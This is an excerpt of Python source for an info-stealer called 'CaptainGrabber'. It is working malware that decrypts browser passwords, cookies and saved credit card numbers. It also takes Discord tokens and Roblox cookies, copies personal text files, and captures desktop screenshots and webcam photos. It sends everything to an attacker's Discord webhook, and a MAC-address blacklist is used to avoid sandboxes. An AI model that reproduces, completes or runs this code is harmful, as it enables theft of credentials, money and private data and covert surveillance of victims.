...
def send_webhook(webhook_url, data=None, files=None, json_data=None):
    """Universal webhook sender with proper error handling"""
    try:
        if files:
            response = requests.post(webhook_url, files=files, timeout=30)
        elif json_data:
            response = requests.post(webhook_url, json=json_data, timeout=30)
        elif data and 'file' in data:
            encoder = MultipartEncoder(data)
            response = requests.post(webhook_url, headers={'Content-type': encoder.content_type}, data=encoder, timeout=30)
        elif data:
...
def main():
    ...
    if not webhook or webhook == "None" or not webhook.startswith("https://"):
        print("ERROR: No valid webhook configured!")
        return
    ...
    if __CONFIG__["personalfiles"]:
        threads.append(PersonalFiles)
    ...
    # Prepare main data
    data = {
        "username": "CaptainGrabber",
        "avatar_url": "https://avatars.githubusercontent.com/u/122227290?v=4",
        "content": f"@everyone" if __CONFIG__["ping"] and __CONFIG__["pingtype"] == "Everyone" else f"@here" if __CONFIG__["ping"] and __CONFIG__["pingtype"] == "Here" else None
    }

    _file = f'{localappdata}\\CaptainGrabber-Logged-{os.getlogin()}.zip'

    # Send the main zip file if we have any data
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes", "personalfiles"]):
        if os.path.exists(_file) and os.path.getsize(_file) > 0:
            with open(_file, 'rb') as file:
                webhook_data = {
                    'payload_json': (None, json.dumps(data), 'application/json'),
                    'file': (f'CaptainGrabber-Logged-{os.getlogin()}.zip', file, 'application/zip')
                }
                send_webhook(webhook, files=webhook_data)

    # Send system info if enabled
    if __CONFIG__["systeminfo"]:
        PcInfo(webhook)

    # Send Discord tokens if enabled
...
def zipup():
    _zipfile = os.path.join(localappdata, f'CaptainGrabber-Logged-{os.getlogin()}.zip')
...
class PersonalFiles:
    def __init__(self):
        self.max_total_size = 10 * 1024 * 1024  # 10MB in bytes (Discord limit)
        self.collected_size = 0
        
        if __CONFIG__["personalfiles"]:
            self.grab_personal_files()
    ...
    def should_include_file(self, filepath):
        ...
        try:
            ...
            # Check file size (skip files larger than 2MB individually)
            file_size = os.path.getsize(filepath)
            if file_size > 2 * 1024 * 1024:  # 2MB
                return False
            
            # Check if adding this file would exceed total limit
            if self.collected_size + file_size > self.max_total_size:
                return False
    ...
    def copy_file(self, src_path, dest_folder, relative_path):
        """Copy file to destination with relative path structure"""
        try:
            dest_path = os.path.join(dest_folder, relative_path.lstrip(os.sep))
            os.makedirs(os.path.dirname(dest_path), exist_ok=True)
            shutil.copy2(src_path, dest_path)
            
            # Update collected size
            self.collected_size += os.path.getsize(src_path)
            return True
        except Exception as e:
            print(f"Failed to copy {src_path}: {e}")
            return False

    def grab_personal_files(self):
        """Main method to grab .txt files from personal folders"""
        personal_folders = [
        ...
        personal_files_dir = os.path.join(temp_path, "PersonalFiles")
        os.makedirs(personal_files_dir, exist_ok=True)
        ...
        for folder in personal_folders:
            ...
            print(f"Scanning {folder_name} for .txt files...")
            ...
            for root, dirs, files in os.walk(folder):
                ...
                for file in files:
                    if self.collected_size >= self.max_total_size:
                        break
                    ...
                    if self.should_include_file(file_path):
                        ...
                        dest_relative_path = os.path.join(folder_name, relative_path)
                        
                        if self.copy_file(file_path, personal_files_dir, dest_relative_path):
                            files_collected += 1
                            file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
                            total_size_mb += file_size_mb
                            
                            # Progress update every 10 files
                            if files_collected % 10 == 0:
                                print(f"Collected {files_collected} .txt files ({total_size_mb:.2f} MB)...")
        ...
        summary_path = os.path.join(personal_files_dir, "collection_summary.txt")
        with open(summary_path, 'w', encoding='utf-8') as f:
            f.write("Personal Files Collection Summary\n")
            f.write("================================\n\n")
            f.write(f"File type: .txt files only\n")
            f.write(f"Total .txt files collected: {files_collected}\n")
            f.write(f"Total size: {total_size_mb:.2f} MB\n")
            f.write(f"Size limit: 10.00 MB (Discord limit)\n")
            f.write(f"Folders scanned:\n")
            for folder in personal_folders:
                if os.path.exists(folder):
                    f.write(f"  - {folder}\n")
            f.write(f"\nCollection completed at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        print(f"Personal .txt files collection completed: {files_collected} files ({total_size_mb:.2f} MB)")
...
class PcInfo:
    ...
    def get_inf(self, webhook):
        try:
                ...
                "embeds": [
                    {
                        ...
                        "footer": {
                            "text": "CaptainGrabber | Created By @domdoesdodrip on Github"
                        },
                        "thumbnail": {
                            "url": "https://avatars.githubusercontent.com/u/122227290?v=4"
                        }
                    }
                ],
                "username": "CaptainGrabber",
            ...
            send_webhook(webhook, json_data=data)
        except Exception as e:
...
class Discord:
                    ...
                    for file_name in os.listdir(path):
                        ...
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                ...
                                if token and token != "Failed to decrypt password":
    ...
    def robloxinfo(self):
        if __CONFIG__["roblox"]:
            roblox_cookie_path = os.path.join(temp_path, "Browser", "roblox cookies.txt")
            if os.path.exists(roblox_cookie_path):
                with open(roblox_cookie_path, 'r', encoding="utf-8") as f:
                    robo_cookie = f.read().strip()
                    if robo_cookie and robo_cookie != "No Roblox Cookies Found":
                        ...
                        if info is not None:
                                ...
                                "embeds": [
                                    {
                                        ...
                                        "footer": {
                                            "text": "CaptainGrabber | Created By Captain"
                                        },
                                    }
                                ],
                                "username": "CaptainGrabber",
                            ...
                            send_webhook(self.webhook, json_data=data)
        ...
        try:
            ...
            if os.path.exists(screenshot_path):
                with open(screenshot_path, "rb") as f:
                    files = {
                        'file': ('desktop_screenshot.png', f, 'image/png')
                    }
                    data = {
                        "username": "CaptainGrabber",
                        "avatar_url": "https://avatars.githubusercontent.com/u/122227290?v=4",
                    ...
                    send_webhook(self.webhook, data=data, files=files)
        except Exception as e:
            print(f"Screenshot error: {e}")

        # Take and send webcam photo
        try:
            camera = cv2.VideoCapture(0)
            if camera.isOpened():
                return_value, image = camera.read()
                if return_value:
                    webcam_path = os.path.join(temp_path, "webcamshot.png")
                    cv2.imwrite(webcam_path, image)
                    
                    if os.path.exists(webcam_path):
                        with open(webcam_path, "rb") as f:
                            files = {
                                'file': ('webcam_screenshot.png', f, 'image/png')
                            }
                            data = {
                                "username": "CaptainGrabber",
                                "avatar_url": "https://avatars.githubusercontent.com/u/122227290?v=4",
                                "content": "Webcam Screenshot"
                            }
                            send_webhook(self.webhook, data=data, files=files)
    ...
    def passwords(self, name: str, path: str, profile: str):
        ...
        try:
            ...
            for results in cursor.fetchall():
                ...
                url = results[0]
                login = results[1]
                password = self.decrypt_password(results[2], self.masterkey) if self.masterkey else ""
                if password:
        ...
        try:
            ...
            with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
                ...
                for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                    ...
                    value = self.decrypt_password(encrypted_value, self.masterkey) if self.masterkey else ""
        ...
        try:
            ...
            with open(cc_file_path, 'a', encoding="utf-8") as f:
                ...
                for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                    ...
                    card_number = self.decrypt_password(card_number_encrypted, self.masterkey) if self.masterkey else ""
                    if card_number:
...
class Debug:
    ...
    def checks(self):
        ...
        self.blackListedMacs = [
            ...
            '42:85:07:f4:83:d0', '56:b0:06f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3',
